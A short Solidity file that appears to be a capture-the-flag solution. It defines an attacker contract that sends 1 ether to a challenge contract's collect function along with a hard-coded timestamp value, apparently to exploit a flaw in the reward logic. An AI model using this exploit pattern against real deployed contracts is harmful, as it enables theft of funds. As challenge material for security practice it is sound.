pragma solidity 0.8.4;

import "./Setup.sol";

contract smbspAttacker {
    
    constructor(CollectReward instance) payable {
        require(msg.value == 1 ether);
        instance.collect{value: 1 ether}(1645230775);
    }

    receive() external payable { 
    }

}